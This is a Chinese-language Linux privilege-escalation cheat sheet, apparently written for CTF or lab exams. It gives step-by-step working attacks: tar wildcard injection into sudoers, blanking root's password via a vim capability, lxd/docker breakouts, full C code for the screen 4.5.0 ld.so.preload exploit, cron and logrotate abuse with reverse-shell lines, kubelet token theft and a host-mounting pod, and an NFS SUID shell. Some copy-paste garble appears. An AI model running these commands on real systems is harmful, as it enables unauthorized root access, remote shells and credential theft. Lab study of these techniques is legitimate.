# Linux 權限提升



## **🔍 1. 資訊收集**

<table><thead><tr><th width="49.10546875">序號</th><th width="185.09765625">資訊收集指令</th><th width="343.5859375">可能發現的狀況</th><th>權限提升類型 (特別列明版本資訊)</th></tr></thead><tbody><tr><td>1</td><td><code>id</code></td><td>可能屬於 disk、adm、docker、lxd 等群組</td><td>Disk 提權、ADM 提權、Docker 提權、LXC/LXD 提權</td></tr><tr><td>2</td><td><code>uname -a</code></td><td>Linux 核心版本 (例如 5.8 至 5.17 存在 Dirty Pipe 漏洞)</td><td><a data-mention href="linux-quan-xian-ti-sheng.md#linux-he-xin-lou-dong-kernel-exploits-quan-xian-ti-sheng">#linux-he-xin-lou-dong-kernel-exploits-quan-xian-ti-sheng</a></td></tr><tr><td>3</td><td><code>cat /etc/lsb-release</code></td><td>Ubuntu 20.04 或更舊，可能有 sudo 漏洞</td><td><a data-mention href="linux-quan-xian-ti-sheng.md#linux-he-xin-lou-dong-kernel-exploits-quan-xian-ti-sheng">#linux-he-xin-lou-dong-kernel-exploits-quan-xian-ti-sheng</a></td></tr><tr><td>4</td><td><code>sudo -l</code></td><td>出現可免密碼或 SETENV 執行特定程式</td><td><a data-mention href="linux-quan-xian-ti-sheng.md#gtfobins-lu-jing-lan-yong">#gtfobins-lu-jing-lan-yong</a></td></tr><tr><td></td><td> 憑證獵取</td><td></td><td><a data-mention href="linux-quan-xian-ti-sheng.md#linux-ping-zheng-lie-qu">#linux-ping-zheng-lie-qu</a></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td><code>find / -type f -iname "*flag*" 2>/dev/null</code></td><td>含有 "flag" 關鍵字檔案</td><td>資訊收集</td></tr><tr><td>6</td><td><code>ls -la /home/*</code></td><td>主目錄內有敏感檔案如 flag 或證書</td><td>資訊收集</td></tr><tr><td>7</td><td><code>find / -type f -iregex '.*\(pass|secret|key|token|config|env\).*' 2>/dev/null</code></td><td>含敏感關鍵字檔案，如 secret、key</td><td>資訊收集</td></tr><tr><td>8</td><td><code>find / -type f \( -iname ".env" -o -iname "*.env" -o -iname ".git*" -o -iname "*config*" \) 2>/dev/null</code></td><td>常見敏感檔案 (.env, .git)</td><td>資訊收集</td></tr><tr><td>9</td><td><code>find / -type f -path "*/.ssh/*" 2>/dev/null</code></td><td>SSH 私鑰或憑證</td><td>資訊收集</td></tr><tr><td>10</td><td><code>cat ~/.bash_history</code> 或 <code>cat ~/.zsh_history</code></td><td>歷史命令含敏感資訊如密碼</td><td>資訊收集</td></tr><tr><td>11</td><td><code>find / -type f -iregex '.*\(bak|backup|old|tar|zip\)$' 2>/dev/null</code></td><td>系統中容易被忽略的備份檔案</td><td>資訊收集</td></tr><tr><td>12</td><td><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;</code></td><td>檢查有 cap_setuid 權限檔案</td><td>Linux Capabilities 提權</td></tr><tr><td>13</td><td><code>cat /etc/crontab</code></td><td>發現 cron job 路徑可寫</td><td>Cron Job 濫用</td></tr><tr><td>14</td><td><code>screen -v</code></td><td>版本 ≤ 4.5.0 存在漏洞</td><td>Screen Vulnerable (版本 ≤ 4.5.0)</td></tr><tr><td>15</td><td><code>find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null</code></td><td>發現 root 執行嘅可寫 script</td><td>通配符濫用 (tar 等)</td></tr><tr><td>16</td><td><code>cat /etc/logrotate.conf</code> 和 <code>grep "create|compress" /etc/logrotate.conf</code></td><td>logrotate 設定不當</td><td>日誌輪轉 Logrotate</td></tr><tr><td>17</td><td><code>ps aux | grep tmux</code></td><td>tmux 會話有 socket 未保護</td><td>tmux 劫持 (Hijacking Tmux Sessions)</td></tr><tr><td>18</td><td><code>ss -tulnp</code> 或 <code>netstat -tulnp</code></td><td>開放的服務可能被利用</td><td>被動流量捕獲或服務利用</td></tr><tr><td>19</td><td><code>cat /etc/resolv.conf</code></td><td>DNS 配置洩漏內部網域資訊</td><td>資訊收集</td></tr><tr><td>20</td><td><code>showmount -e &#x3C;ip></code></td><td>發現 no_root_squash 的 NFS 設定</td><td>弱 NFS 權限 (Weak NFS Privileges) 提權</td></tr><tr><td>21</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td><td>可疑 SUID 檔案 (可能被利用)</td><td>GTFOBins 路徑濫用</td></tr><tr><td>22</td><td><code>ls -l mem_status.py</code></td><td>發現 SUID Python 檔案引用可寫入模組</td><td>Python 函式庫劫持</td></tr><tr><td>23</td><td><code>pkexec -u root id</code></td><td>polkit 版本存在漏洞</td><td>Polkit 波爾基特 (CVE-2021-4034 / PwnKi)</td></tr><tr><td>24</td><td><code>readelf -d &#x3C;binary> | grep PATH</code></td><td>RUNPATH 指向可寫入路徑</td><td>共享對象劫持 (Shared Object Hijacking)</td></tr><tr><td>25</td><td><code>find / -perm -o+w -type d 2>/dev/null</code></td><td>發現可寫目錄，可用作共享對象劫持</td><td>共享對象劫持 (Shared Object Hijacking)</td></tr><tr><td>26</td><td><code>cat /etc/passwd</code></td><td>發現異常使用者或提示</td><td>資訊收集</td></tr></tbody></table>

***

#### ⚠️&#x20;

{% hint style="info" %}
1. **用户组检查：** 首先，通过 `id` 命令检查当前用户所属的组别，确定是否属于具有特殊权限的组，如 `disk`、`adm`、`docker`、`lxd` 等。这些组的成员可能拥有对系统关键部分的访问权限，可能导致权限提升。​**使用者群組檢查：** 首先，透過 `id` 指令檢查目前使用者所屬的組別，確定是否屬於具有特殊權限的群組，如 `disk` 、 `adm` 、 `docker` 、 `lxd` 等。這些群組的成員可能擁有對系統關鍵部分的存取權限，可能導致權限提升。 號
2. **系统版本信息：** 接下来，使用 `uname -a` 和 `cat /etc/lsb-release` 获取内核版本和操作系统版本信息。这有助于识别已知的漏洞和可利用的漏洞利用方式。​**系統版本資訊：** 接下來，使用 `uname -a` 和 `cat /etc/lsb-release` 取得核心版本和作業系統版本資訊。這有助於識別已知的漏洞和可利用的漏洞利用方式。 號
3. **sudo 权限：** **sudo 權限：** 使用 `sudo -l` 檢查目前使用者的 sudo 權限配置，識別可能的不安全配置或可利用的權限提昇路徑。號使用 `sudo -l` 检查当前用户的 sudo 权限配置，识别可能的不安全配置或可利用的权限提升路径。​
4. **文件搜索与检查：** 然后，使用一系列 `find` 命令和其他文件检查命令，搜索系统中可能包含敏感信息或可利用的文件和目录。这些步骤有助于收集潜在的漏洞利用信息。​**檔案搜尋與檢查：** 然後，使用一系列 `find` 指令和其他檔案檢查指令，搜尋系統中可能包含敏感資訊或可利用的檔案和目錄。這些步驟有助於收集潛在的漏洞資訊。 號
5. **计划任务与服务：** 检查计划任务配置（如 `cat /etc/crontab`）和正在运行的服务（如 `ss -tulnp`），识别可能存在的安全漏洞或可利用的服务。​**排程任務與服務：** 檢查排程任務配置（如 `cat /etc/crontab` ）和正在執行的服務（如 `ss -tulnp` ），識別可能存在的安全漏洞或可利用的服務。 號
6. **特殊权限文件：** 搜索具有特殊权限的文件（**特殊權限檔案：** 搜尋具有特殊權限的檔案


{% endhint %}



***

## **🚀 2.** 權限提升

<details>

<summary> GTFOBins : 路徑濫用</summary>

### ✅ 步驟1️⃣：先進行本地系統枚舉

你需要找到可疑的執行檔或權限：

* **找 sudo 權限**：

```bash
sudo -l
```

> 如果結果裡面有 `NOPASSWD: /usr/bin/something`\
> → 記下 `something` 這個指令，去 GTFOBins 搜索！

***

* **找 SUID 程式**（root 權限執行檔）：

```bash
find / -perm -4000 -type f 2>/dev/null
```

> 看到的可執行檔，例如 `/usr/bin/nmap` 或 `/usr/bin/vim`\
> → 記下來，去 GTFOBins 搜索！

***

* **找 capabilities**：

```bash
find / -type f -exec getcap {} \; 2>/dev/null
```

> 如果出現像 `/usr/bin/vim.basic = cap_dac_override+ep`\
> → 把 `vim` 記下來，去 GTFOBins 搜索！

***

### ✅ 步驟2️⃣：打開 [https://gtfobins.github.io/](https://gtfobins.github.io/)

***

### ✅ 步驟3️⃣：搜尋你剛剛枚舉到的執行檔

👉 例如你找到 `/usr/bin/nmap`

* 去 GTFOBins 主頁，在「Search」欄輸入：`nmap`

***

### ✅ 步驟4️⃣：點進去之後看分類

會有幾個 section：

* `Shell`（怎麼用它打出反彈 shell 或本地 shell）
* `SUID`（如果有 SUID 權限怎麼利用）
* `sudo`（如果可以 sudo 執行這個程式怎麼提權）
* `File Write` / `File Read`（可讀可寫檔案）
* `Capabilities`（如果有 cap 權限可以怎麼繞過限制）

👉 你根據你找到的權限去看對應的章節！

***

### ✅ 步驟5️⃣：跟著 payload 做！

例如：

* 如果 `nmap` 有 SUID 權限，網頁上會寫：

```bash
bash複製編輯nmap --interactive
!sh
```

* 代表你只需要輸入這兩行，你就 root 了！

***

### ✅ 實戰示範：

舉例：

> 你枚舉出 `/usr/bin/vim.basic = cap_dac_override+ep`

* 去 GTFOBins 搜尋 `vim`
* 找到 `Capabilities` 章節
* 跟著網頁 payload：

```
nginx複製編輯vim -c ':!sh'
```

* 然後就拿到 shell！

</details>

<details>

<summary>利用 vim.basic :   通配符濫用</summary>

1️⃣ 找出有 `cap_dac_override` 權限的執行檔

執行以下指令：

```bash
find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \;
```

這個指令會幫你列出有 `cap` 權限的檔案。\
✅ 如果你看到像這樣的結果：

```bash
/usr/bin/vim.basic = cap_dac_override+ep
```

代表 `vim.basic` 可以用來打開系統檔案。

***

### 2️⃣ 利用 `vim.basic` 開啟 `/etc/passwd`

輸入：

```bash
/usr/bin/vim.basic /etc/passwd
```

這樣可以用 `vim` 打開 `/etc/passwd`，一般來說是不能修改的，但是因為有 cap\_dac\_override，所以可以！

***

### 3️⃣ 編輯 `/etc/passwd`

打開後：

* 找到最上面那一行：

```bash
root:x:0:0:root:/root:/bin/bash
```

* 把 `x` 刪掉，變成：

```bash
root::0:0:root:/root:/bin/bash
```

* 存檔離開（在 vim 輸入 `:wq` 然後按 `Enter`）

***

### 4️⃣ 使用 `su` 切換成 root

現在可以直接輸入：

```bash
su root
```

然後直接按 `Enter`，不需要密碼，就會變成 root。

</details>

<details>

<summary>通配符濫用 (tar )</summary>

#### 一、枚舉階段（找漏洞）

**1️⃣ 枚舉 cron job**

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

如果需要 sudo：

```bash
sudo cat /etc/crontab
sudo ls -la /etc/cron.*
```

**2️⃣ 看 cron job 裡面有沒有 `*`（星號）**

範例：

```
*/1 * * * * root cd /some/path && tar -czf backup.tar.gz *
```

✅ 發現有星號 `*` 且執行者是 `root`，表示有機會。

**3️⃣ 確認用的程式是不是有漏洞**

| 程式名   | 是否可以用通配符漏洞                          | 說明                                                                                                             |
| ----- | ----------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| tar   | ✅ 支援 `--checkpoint-action=exec=CMD` | <p>非常常見漏洞</p><p></p><pre class="language-shell-session"><code class="lang-shell-session">man tar
</code></pre> |
| zip   | 部分版本 ✅                              | 可嘗試                                                                                                            |
| rsync | ✅ 可利用 `--rsync-path`                | 少見但強大                                                                                                          |
| find  | 可利用 `-exec`                         | 較少用作通配符攻擊，但可以配合不安全參數利用                                                                                         |

**4️⃣ 檢查目錄可寫權限**

```bash
ls -ld /some/path
```

如果有 `w`（寫入）權限，代表你可以放入惡意檔案。

***

#### 二、利用階段（實戰 Exploit）

👉 以下以 tar 為例（最常見）

**1️⃣ 建立 root.sh（放入惡意指令）**

```bash
echo 'echo "youruser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

> 把 `youruser` 換成你的帳號。

**2️⃣ 建立特殊檔名（讓 tar 自己執行）**

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > "--checkpoint=1"
```

**3️⃣ 等待 cron job 自動執行（或手動觸發）**

* 當 root 的 cron job 執行 tar 時，它會自動執行 `root.sh`

**4️⃣ 檢查 sudo 權限**

```bash
sudo -l
```

應該會看到 `NOPASSWD: ALL`\
代表可以無密碼 sudo。

**5️⃣ 提權成功**

```bash
sudo su
```

拿到 root！

</details>

<details>

<summary> 逃離受限 Shell</summary>

### ✅ 一、Command Injection（指令注入逃脫）

#### 💡 什麼意思？

當受限 shell 只允許執行固定參數指令（例如只能用 `ls -l`），\
你可以把**額外指令透過參數注入**進去執行！

#### ✅ 範例：

```bash
ls -l `pwd`
```

或

```bash
ls -l $(whoami)
```

➡ 後面的 `pwd`、`whoami` 雖然 shell 不允許直接打，但透過反引號 / `$()` 注入執行！

***

### ✅ 二、Command Substitution（命令替換逃脫）

#### 💡 什麼意思？

用反引號 `` `command` `` 或 `$()` 方式，\
讓 shell 在允許指令參數中偷偷執行其他指令。

#### ✅ 範例：

```bash
ls -l `id`
ls -l $(id)
```

➡ 它會執行 `id`，把結果當參數傳給 `ls`，實現逃脫。

***

### ✅ 三、Command Chaining（命令鏈逃脫）

#### 💡 什麼意思？

利用 `;`、`&&`、`||` 等符號，\
在受限 shell 裡同時執行多個指令。

#### ✅ 範例：

```bash
ls -l ; /bin/sh
```

➡ `ls -l` 之後就直接打開 `/bin/sh`！

如果 `;` 被過濾，可以試 `&&` 或 `|`：

```bash
ls -l && /bin/sh
ls -l | /bin/sh
```

***

### ✅ 四、Environment Variables（環境變數逃脫）

#### 💡 什麼意思？

修改 `PATH` 環境變數或定義特殊變數，\
讓 shell 使用到可控路徑中的惡意程式或開放指令。

#### ✅ 範例：

```bash
export PATH=/tmp:$PATH
echo '/bin/sh' > /tmp/ls
chmod +x /tmp/ls
```

➡ 下次執行 `ls` 就會變成執行你自定義的 `/bin/sh`。

***

### ✅ 五、Shell Functions（自定義函數逃脫）

#### 💡 什麼意思？

如果 shell 允許定義 function，你可以建立一個函數覆蓋原本的指令，\
讓它執行惡意命令。

#### ✅ 範例：

```bash
function ls { /bin/sh; }
ls
```

➡ 下次執行 `ls` 時直接彈出 shell！

</details>

<details>

<summary>LXC / LXD 提權</summary>

#### ✅ 條件判斷

執行：

```bash
id
```

如果 `groups` 裡面有 `lxd` ，代表可以用 LXD 提權！

***

#### ✅ LXD 提權完整步驟

> **Step by step：**

1️⃣ 解壓 Alpine 映像檔（通常題目會給 alpine.tar.gz）：

```bash
unzip alpine.zip
cd "64-bit Alpine"
```

2️⃣ 初始化 LXD（遇到提示都選預設）：

```bash
lxd init
```

如果出錯 `must be run as root`，可以忽略或先嘗試 `sudo lxd init`

> 如果不行就直接用 `lxc` 指令。

3️⃣ 匯入 Alpine 映像：

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

4️⃣ 建立特權容器：

```bash
lxc init alpine pwncontainer -c security.privileged=true
```

5️⃣ 把主機掛載進容器：

```bash
lxc config device add pwncontainer pwnroot disk source=/ path=/mnt/root recursive=true
```

6️⃣ 啟動容器：

```bash
lxc start pwncontainer
```

7️⃣ 進入容器拿 root：

```bash
bash複製編輯lxc exec pwncontainer /bin/sh
cd /mnt/root
```

從這裡就可以 root 身份操作整個主機，讀 `/etc/shadow`、改 SSH Key 通通行。

***

### 二、Docker 提權

#### ✅ 判斷方法：

```bash
id
```

如果有 `docker` 群組 → 可以用 docker 提權！

#### ✅ Docker 提權方式

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
```

* `-v /:/mnt`：把主機的根目錄掛到容器 `/mnt`
* `chroot /mnt sh`：進入主機 root
* 現在你就是 root 了！

***

### 三、Disk 群組提權

#### ✅ 判斷方法：

```bash
id
```

如果有 `disk` 群組 → 代表可以存取 `/dev/sda*` 裝置。

#### ✅ 利用方法

* 使用 `debugfs` 或 `fdisk`、`mount` 去掛載硬碟，讀取敏感檔案：

```bash
sudo debugfs /dev/sda1
debugfs: cat /etc/shadow
```

可以直接讀出 root 密碼 hash。

***

### 四、ADM 群組利用

#### ✅ 判斷方法：

```bash
id
```

如果有 `adm` 群組 → 可以讀取 `/var/log/` 日誌。

#### ✅ 利用方向

* 閱讀 log，發現敏感資料

```bash
cat /var/log/auth.log
cat /var/log/mysql/error.log
cat /var/log/nginx/access.log
```

* 常見線索：
  * cron job 執行的內容
  * 認證憑證或密碼被誤記錄在 log
  * 有人手誤打過 `sudo` 密碼被記錄下來

</details>

<details>

<summary> Linux Capabilities 提權</summary>

### 1️⃣ 什麼是 Linux Capabilities？

Linux capabilities 是一種安全設計，\
可以讓**特定執行檔**獲得部分 root 權限（不需要整個 root）。

這樣可以：

* 控制更細粒度的權限
* 比傳統的 sudo、setuid 更靈活

***

### 2️⃣ 常見危險 Capabilities（遇到要特別注意）

| 能力（Capability）              | 危險用途說明                           |
| --------------------------- | -------------------------------- |
| **cap\_dac\_override**      | 允許繞過檔案讀寫執行權限，可以打開或修改任何檔案         |
| **cap\_sys\_admin**         | 超級大權限，幾乎等同 root，可以掛載系統、修改設定      |
| **cap\_setuid**             | 允許程式改變自己 UID，可以偽裝成其他使用者（甚至 root） |
| **cap\_setgid**             | 允許改變 GID，同樣可以透過群組提權              |
| **cap\_net\_bind\_service** | 允許在低端口（1024以下）開伺服器，一般需要 root 權限  |
| **cap\_sys\_ptrace**        | 允許 attach & 偵錯其他程序，可能繞過保護或提權     |

***

### 3️⃣ 如何列舉系統所有 capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

舉例結果：

```
/usr/bin/vim.basic cap_dac_override=ep
/usr/bin/ping cap_net_raw=ep
```

✅ 把結果拿去 GTFOBins 查詢，或者判斷是否可直接用來繞過限制。

***

### 4️⃣ 利用範例：

#### ✅ （範例 1）利用 cap\_dac\_override

假設找到：

```
/usr/bin/vim.basic cap_dac_override=ep
```

代表可以繞過檔案權限，直接打開 `/etc/passwd` 編輯！

步驟：

```bash
/usr/bin/vim.basic /etc/passwd
```

將：

```
root:x:0:0:root:/root:/bin/bash
```

改成：

```
root::0:0:root:/root:/bin/bash
```

儲存後：

```bash
su root
```

直接 root！

***

#### ✅ （範例 2）非互動模式修改 /etc/passwd

如果不想開互動編輯，可以一行解決：

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

然後直接 `su root` 即可！

***

#### ✅ （範例 3）cap\_sys\_admin 利用

* 如果有 `cap_sys_admin`，可以透過 `mount` 掛載設備、使用 `pivot_root` 或直接改系統設定。
* 或使用 `fuse`、`modprobe` 等間接方法取得 shell。

***

### 5️⃣ 如何清除 Capabilities（系統管理員角度）

```bash
sudo setcap -r /path/to/binary
```

`-r` 代表 remove capabilities。

***

### 6️⃣ 小結表（考試 / CTF 快速參考）

| 能力名稱                    | 危險程度 | 用途                                     | 如何利用                         |
| ----------------------- | ---- | -------------------------------------- | ---------------------------- |
| cap\_dac\_override      | 高    | 可繞過檔案存取權限                              | 編輯 `/etc/passwd` 讓 root 無密碼  |
| cap\_sys\_admin         | 非常高  | 幾乎 root 全能                             | 掛載、注入核心模組、直接系統控制             |
| cap\_setuid             | 高    | 可以把程式提權執行                              | 利用程式讓自己 UID 變 root           |
| cap\_net\_bind\_service | 中    | 開低埠服務                                  | 開 80 埠、443 埠 listener，偷資料、釣魚 |
| cap\_sys\_ptrace        | 高    | 可以 attach 其他 process，看 memory、注入 shell | 偵錯其他程式取得密碼或注入 payload        |

***

### 7️⃣ 終極一行 — 列舉 + 分析

```bash
find / -type f -exec getcap {} \; 2>/dev/null | grep -E 'cap_dac_override|cap_sys_admin|cap_setuid|cap_sys_ptrace'
```

找出系統中最值得關注的 binary。

</details>

<details>

<summary> Screen Vulnerable</summary>

### ✅ **漏洞確認步驟**：

1️⃣ 查看 screen 版本：

```bash
screen -v
```

如果小於或等於 `4.5.0`：

```
Screen version 4.05.00 (GNU) 10-Dec-16
```

✅ 確認漏洞存在。

2️⃣ 查看是否有 setuid 權限：

```bash
ls -l /usr/bin/screen
```

看到 `rws`（setuid）就是有漏洞。

***

### ✅ **利用流程（完整 PoC）**

#### 步驟一：建立惡意 so 檔案

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

* 這個程式碼的作用是：
  * 把 `/tmp/rootshell` 改成 root 擁有
  * 給予 setuid 權限
  * 並清理 `ld.so.preload`

編譯：

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

***

#### 步驟二：建立 rootshell

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

編譯：

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

***

#### 步驟三：利用 Screen 輸入 payload

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
```

* 這行會創建 `/etc/ld.so.preload` 且內容是 `/tmp/libhax.so`
* 每當有 binary 載入共享函式庫時，會執行 `dropshell`

***

#### 步驟四：觸發

```bash
screen -ls
```

* `screen` 自己就是 setuid binary，觸發之後 `/tmp/rootshell` 已經有 root 權限。

***

#### 步驟五：拿到 root

```bash
/tmp/rootshell
id
```

✅ 你就 root 了！

***

###

</details>

<details>

<summary>Cron Job 濫用</summary>

#### ✅ 枚舉步驟

* 查看所有 world-writable 檔案（所有人可寫）

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

* 找到像這種：

```
/dmz-backups/backup.sh
```

* 用 `ls -la` 查看權限：

```bash
ls -la /dmz-backups/
```

如果看到：

```
-rwxrwxrwx  1 root root backup.sh
```

代表**以 root 執行但可被你編輯**，超危險！

***

### 3️⃣ 確認 cron job 正在執行

* 使用 `pspy`（無 root 權限也能用）觀察：

```bash
./pspy64 -pf -i 1000
```

* 當 pspy 顯示：

```
UID=0    | /bin/bash /dmz-backups/backup.sh
```

✅ 證明 cron job 正在定時用 root 執行這個 script！

***

### 4️⃣ 如何利用漏洞

#### ✅ （步驟一）備份原始腳本

```bash
cp /dmz-backups/backup.sh /tmp/backup.sh.bak
```

#### ✅ （步驟二）編輯 backup.sh

把你的反向 shell 加到腳本最後面：

```bash
echo "bash -i >& /dev/tcp/你的IP/你的Port 0>&1" >> /dmz-backups/backup.sh
```

或者手動編輯加入：

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/你的IP/你的PORT 0>&1
```

#### ✅ （步驟三）開啟 netcat 等待連線

```bash
nc -lnvp 你的PORT
```

#### ✅ （步驟四）等待 cron job 觸發（通常 3 分鐘內）

你就會看到 root shell 連進來！

***

### 5️⃣ 成功範例

```nginx
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12]
root@NIX02:~# id
uid=0(root) gid=0(root)
```

✅ 你就 root 了！

***

###

</details>

<details>

<summary>匿名 Kubelet API 存取</summary>

### 4️⃣ 常見攻擊面

#### ✅ 匿名 Kubelet API 存取

* Kubelet API 常開放在 `10250` port
* 匿名訪問測試：

```bash
curl -k https://<target-ip>:10250/pods
```

若有回應 `PodList`，代表匿名可讀 Pod 資訊。

***

### 5️⃣ 利用 kubeletctl 工具進行自動化操作

安裝方式：

```bash
go install github.com/cyberark/kubeletctl@latest
```

常用指令範例：

* 列出 Pod：

```bash
kubeletctl --server <ip> pods
```

* 執行指令 (例如查看 ID)：

```bash
kubeletctl --server <ip> exec "id" -p <pod-name> -c <container-name>
```

* 掃描可 RCE 的 Pod：

```bash
kubeletctl --server <ip> scan rce
```

* 取得 Token：

```bash
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod-name> -c <container-name> > k8.token
```

* 取得 CA 證書：

```bash
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod-name> -c <container-name> > ca.crt
```

***

### 6️⃣ 利用取得的 token / ca.crt 操作 kubectl

* 驗證權限：

```bash
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 auth can-i --list
```

* 如果擁有 `create` pod 權限，可以建立掛載主機根目錄的惡意 Pod。

***

### 7️⃣ 惡意 Pod YAML 範例 (掛載主機 `/` )

```yaml
yaml複製編輯apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

* 建立 Pod：

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 apply -f privesc.yaml
```

* 確認 Pod 運行：

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 get pods
```

* 進入 Pod 內部、提取主機 root 資料：

```bash
kubeletctl --server <ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

</details>

<details>

<summary>日誌旋轉 Logrotate</summary>

### 1️⃣ **什麼是 Logrotate？**

* **logrotate** 是 Linux 系統自動管理日誌（log）的工具。
* 主要功能：
  * 定期壓縮、歸檔、刪除舊日誌
  * 減少磁碟空間使用
  * 預設由 **cron** 週期性執行

***

### 2️⃣ **可被利用的漏洞條件**

1. 我們必須擁有**可寫入的日誌檔案**
2. logrotate 必須以 **root 或高權限** 執行
3. 系統中使用的 logrotate 版本為易受攻擊版本：
   * 3.8.6
   * 3.11.0
   * 3.15.0
   * 3.18.0

***

### 3️⃣ **漏洞原理 (logrotten)**

* 透過將惡意 payload 注入日誌檔案
* 當 logrotate 運行，並根據 `create` 選項重新建立 log 時
* 惡意內容會被執行，達到本地提權

***

### 4️⃣ **確認系統配置**

1. 查看全域設定檔：

```bash
cat /etc/logrotate.conf
```

2. 確認是否使用 `create` 選項（代表會執行重新建立行為）：

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

如果看到：

```
create
```

✅ 表示可以用 logrotten 利用此行為！

***

### 5️⃣ **準備漏洞工具 logrotten**

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

***

### 6️⃣ **準備 Payload**

* 常見反向 shell 一行式：

```bash
echo 'bash -i >& /dev/tcp/你的IP/PORT 0>&1' > payload
```

例如：

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

***

### 7️⃣ **開啟本地監聽器**

```bash
nc -nlvp 9001
```

等待反彈 shell。

***

### 8️⃣ **執行漏洞攻擊**

```bash
./logrotten -p ./payload /tmp/tmp.log
```

* `/tmp/tmp.log` 就是你有寫權限的日誌檔案路徑。

***

### 9️⃣ **結果**

等 cron job 執行 logrotate 後，你的 listener 裡會看到連線：

```
Connection received on 10.129.24.11 49818
# id
uid=0(root) gid=0(root) groups=0(root)
```

✅ 提權成功！

***

###

</details>

<details>

<summary>tmux 劫持 (Hijacking Tmux Sessions)</summary>

### 🎯 **攻擊前提**

* 系統上有一個 tmux session 在執行
* 該 tmux 的 socket 檔案權限設定為某個群組 (例如 devs) 可讀寫
* 你目前的帳號就是該群組成員

***

### ✅ Step by step — 流程

***

#### ① 確認是否有 tmux session 執行中

```bash
ps aux | grep tmux
```

🔎 觀察輸出結果，例如：

```
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

👉 找到 `-S /shareds` 就是 socket 路徑

***

#### ② 檢查 socket 權限

```bash
ls -la /shareds
```

你會看到類似結果：

```
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

⚠ `root devs` 表示這個 socket 檔案屬於 `root`，群組是 `devs`，且 devs 群組成員可以 rw（可讀寫）

***

#### ③ 確認你是不是 devs 群組成員

```bash
id
```

舉例結果：

```
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

✅ 有看到 `devs`，恭喜，可以劫持！

***

#### ④ 附加到該 tmux session

```bash
tmux -S /shareds attach
```

或者

```bash
tmux -S /shareds
```

👉 你現在已經進入 root 的 tmux session 了！

***

#### ⑤ 在 tmux 裡確認身分

```bash
id
```

你應該會看到：

```
uid=0(root) gid=0(root) groups=0(root)
```

✅ root get！

</details>

<details>

<summary>弱 NFS 權限 (Weak NFS Privileges) 提權</summary>

### 攻擊前提：

* NFS 服務有掛載目錄 (例如 `/tmp`、`/var/nfs/general`)
* 設定中存在 `no_root_squash`，代表 root 權限不會被降權，可以直接以 root 身份寫檔
* 我們有掛載權限，可以從本機掛載 NFS

***

### ✅ Step by step — 流程教學

***

#### ① 掃描 NFS 匯出

```bash
showmount -e <目標 IP>
```

範例：

```bash
showmount -e 10.129.2.12
```

輸出範例：

```
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

✅ 表示 `/tmp` 和 `/var/nfs/general` 對所有人開放

***

#### ② 檢查是否有 `no_root_squash`

如果可以，查看 `/etc/exports` （通常需要有主機 shell 權限）：

```bash
cat /etc/exports
```

範例輸出：

```
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

✅ 有 `no_root_squash`，代表 root 可以上傳 suid 二進位！

***

#### ③ 本地建立 SUID Shell 二進位檔

**建立 shell.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

**編譯：**

```bash
gcc shell.c -o shell
```

⚠ 這個 `shell` 程式執行時會直接用 root 權限開 bash

***

